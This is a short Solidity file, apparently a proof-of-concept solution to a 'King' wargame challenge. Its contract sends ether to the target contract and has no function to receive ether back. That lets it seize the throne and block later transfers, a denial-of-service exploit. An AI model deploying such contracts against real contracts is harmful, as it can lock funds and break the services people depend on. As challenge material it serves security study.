pragma solidity ^0.8.0;

import {King} from "./king.sol";

contract KingPOC {
    address king;

    constructor(address _king) {
        king = _king;
    }

    function exploit() public payable {
        address(king).call{value: address(this).balance}("");
        //payable(king).transfer(1 ether); //gas over 2300, trigger revert
    }
}